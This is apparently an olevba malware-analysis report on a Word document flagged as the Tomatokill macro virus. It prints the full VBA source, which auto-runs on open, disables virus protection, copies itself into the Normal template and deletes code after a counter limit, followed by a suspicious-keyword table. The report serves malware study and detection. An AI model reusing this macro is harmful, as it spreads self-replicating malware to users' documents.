olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tomatokill-9bd583865529c3c6f304e836bf1e3abfb9e161c5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tomatokill-9bd583865529c3c6f304e836bf1e3abfb9e161c5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
'---------------------------------------------------------------------
'Tomato
'Tomato killer
'now: 1
'max: 60
On Error GoTo Exit1
VirusProtection = False
SaveNormalPrompt = False
Set ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
If nt.Lines(5, 1) = "'Tomato killer" Then
    t = Val(Mid(nt.Lines(6, 1), 7, 2))
    t = t + 1
    nt.replaceline 6, "'now:" + Str(t)
    If (t > Val(Mid(nt.Lines(7, 1), 7, 2))) Then
        nt.DeleteLines 1, nt.CountOfLines
        NormalTemplate.Save
    End If
Else
    nt.DeleteLines 1, nt.CountOfLines
    s = ad.Lines(1, ad.CountOfLines)
    nt.InsertLines 1, s
    NormalTemplate.Save
End If
If ad.Lines(5, 1) <> "'Tomato killer" Then
    t = Val(Mid(nt.Lines(7, 1), 7, 2))
    t = t + 5
    If (ad.CountOfLines > 0) Then nt.replaceline 7, "'max:" + Str(t)
    ad.DeleteLines 1, ad.CountOfLines
    s = nt.Lines(1, nt.CountOfLines)
    ad.InsertLines 1, s
    ad.replaceline 6, "'now: 0"
    ad.replaceline 7, "'max: 60"
    ActiveDocument.Save
End If
If ad.Lines(5, 1) = "'Tomato killer" Then
    t = Val(Mid(ad.Lines(6, 1), 7, 2))
    t = t + 1
    ad.replaceline 6, "'now:" + Str(t)
    If (t > Val(Mid(ad.Lines(7, 1), 7, 2))) Then ad.DeleteLines 1, ad.CountOfLines
    ActiveDocument.Save
End If
Exit1:
End Sub

Private Sub Document_New()
    Document_Open
End Sub


' AntiTomato
' Copyright (c) Djaa inc. 2001 - 2002
' Åñëè âû íå õîòèòå èñïîëüçîâàòü ýòîò ìàêðîñ, â îêíå ðåäàêòèðîâàíèÿ ïðîåêòà âûäåëèòå âåñü òåêñò è íàæìèòå êíîïêó Delete
' All right reserved

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
